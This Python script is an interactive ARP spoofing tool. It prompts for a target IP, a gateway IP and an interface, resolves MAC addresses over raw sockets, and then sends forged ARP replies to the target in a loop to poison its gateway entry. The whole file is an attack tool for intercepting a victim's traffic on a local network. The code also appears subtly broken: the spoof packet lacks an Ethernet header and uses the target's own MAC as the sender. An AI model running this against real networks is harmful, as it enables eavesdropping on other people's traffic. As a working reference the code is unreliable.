import socket
import struct
import time
import binascii
import sys

def create_arp_packet(target_ip, gateway_ip, target_mac):
    try:
        htype = 1
        ptype = 0x0800
        hlen = 6
        plen = 4
        op = 2
        target_ip_bin = socket.inet_aton(target_ip)
        gateway_ip_bin = socket.inet_aton(gateway_ip)
        arp_packet = struct.pack(
            "!HHBBH6s4s6s4s",
            htype, ptype, hlen, plen, op,
            target_mac, target_ip_bin,
            target_mac, gateway_ip_bin
        )
        return arp_packet
    except socket.error as e:
        print(f"Error creating ARP packet: {e}")
        sys.exit(1)

def get_mac(ip, interface='eth0'):
    try:
        ip_bin = socket.inet_aton(ip)
        sock = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(0x0806))
        sock.bind((interface, 0))
        dest_mac = b'\xff\xff\xff\xff\xff\xff'
        source_mac = b'\x00\x00\x00\x00\x00\x00'
        ethertype = b'\x08\x06'
        arp_packet = struct.pack(
            "!HHBBH6s4s6s4s",
            1, 0x0800, 6, 4, 1,
            source_mac, b'\x00\x00\x00\x00',
            b'\x00\x00\x00\x00\x00\x00', ip_bin
        )
        packet = dest_mac + source_mac + ethertype + arp_packet
        sock.send(packet)
        sock.settimeout(2)
        response = sock.recv(2048)
        mac_address = response[6:12]
        sock.close()
        return mac_address
    except socket.timeout:
        print(f"Timeout while retrieving MAC for {ip}")
        sys.exit(1)
    except socket.error as e:
        print(f"Socket error while retrieving MAC: {e}")
        sys.exit(1)
    except Exception as e:
        print(f"Unexpected error in get_mac: {e}")
        sys.exit(1)

def arp_spoof(target_ip, gateway_ip, interface='eth0', interval=2):
    try:
        print(f"Retrieving MAC addresses for {target_ip} and {gateway_ip}...")
        target_mac = get_mac(target_ip, interface)
        gateway_mac = get_mac(gateway_ip, interface)
        print(f"Target MAC: {binascii.hexlify(target_mac).decode()}")
        print(f"Gateway MAC: {binascii.hexlify(gateway_mac).decode()}")
        arp_packet = create_arp_packet(target_ip, gateway_ip, target_mac)
        sock = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(0x0806))
        sock.bind((interface, 0))
        print("Starting ARP spoofing... Press Ctrl+C to stop.")
        while True:
            sock.send(arp_packet)
            print(f"Sent ARP spoof packet to {target_ip}")
            time.sleep(interval)
    except KeyboardInterrupt:
        print("\nARP spoofing stopped by user.")
        sock.close()
        sys.exit(0)
    except socket.error as e:
        print(f"Socket error during ARP spoofing: {e}")
        sys.exit(1)
    except Exception as e:
        print(f"Unexpected error during ARP spoofing: {e}")
        sys.exit(1)

def validate_ip(ip):
    try:
        socket.inet_aton(ip)
        return True
    except socket.error:
        return False

if __name__ == "__main__":
    target_ip = input("Enter target IP: ").strip()
    gateway_ip = input("Enter gateway IP: ").strip()
    interface = input("Enter network interface (default: eth0): ").strip() or 'eth0'
    if not validate_ip(target_ip) or not validate_ip(gateway_ip):
        print("Invalid IP address format.")
        sys.exit(1)
    arp_spoof(target_ip, gateway_ip, interface)